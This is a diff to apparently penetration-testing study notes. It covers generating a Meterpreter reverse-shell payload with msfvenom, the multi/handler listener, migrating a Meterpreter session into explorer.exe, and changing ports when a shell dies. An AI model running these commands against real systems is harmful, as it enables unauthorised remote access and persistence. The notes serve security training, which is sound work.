@@ -444,6 +444,7 @@ Metasploit reverse shell payloads:
 * http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/
 * https://netsec.ws/?p=331
 
+__WARNING: Meterpreter payloads are restricted to just ONE machine__
 Meterpreter reverse-shell + usage:
 ```bash
 # Windows
@@ -455,6 +456,21 @@ $ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[host] LPORT=444 -f elf -o
 # Use reverse-shell
 msf> use exploit/multi/handler
 ```
+
+Meterpreter migration (if your shell is unstable / process closes or crashes)
+```bash
+meterpreter > ps                # get PID of process of the same/lower privileges 
+PID   PPID  Name              Arch  Session  User                 Path
+---   ----  ----              ----  -------  ----                 ----
+1548  1516  explorer.exe      x86   0        JOE\joe              C:\WINDOWS\Explorer.EXE
+
+meterpreter > migrate 1548
+[*] Migrating from 3048 to 1548...
+[*] Migration completed successfully.
+```
+
+__WARNING: Meterpreter payloads are restricted to just ONE machine__
+
 
 If reverse shell hangs / dies:
 * Try a different port, try a different port. E.g. 443 doesn't work, try 80 or 8080 (see your Nmap results).
